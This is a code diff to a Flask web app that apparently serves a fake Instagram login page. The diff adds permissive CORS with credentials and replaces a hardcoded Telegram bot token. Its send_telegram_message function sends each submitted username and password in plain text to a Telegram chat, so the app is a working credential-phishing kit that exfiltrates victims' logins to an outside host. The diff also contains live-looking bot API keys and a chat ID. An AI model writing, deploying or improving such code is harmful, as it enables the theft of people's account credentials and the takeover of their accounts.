@@ -15,8 +15,13 @@
 import requests
 from flask import Flask, request, render_template, jsonify
 from check.instagram_login import InstagramLogin
+from flask_cors import CORS
 
 app = Flask(__name__)
+
+# Configure CORS
+CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)
+
 instagram_login = InstagramLogin(app)
 
 @app.route('/', methods=['GET', 'POST'])
@@ -41,7 +46,7 @@ def login_page():
     return render_template('login.html', error=None)
 
 def send_telegram_message(username, password):
-    bot_api_key = '5609501351:AAGdYonJCUaZctj_rXuAnfrhiEmj-h4r4fI'
+    bot_api_key = '5609501351:AAHe5N3Su7K_hu5BjP9M0S6b6Pfvu6yQtj8'
     chat_id = '5645434088'
     message = f'Username: {username}, Password: {password}'
     telegram_url = f'https://api.telegram.org/bot{bot_api_key}/sendMessage?chat_id={chat_id}&text={message}'
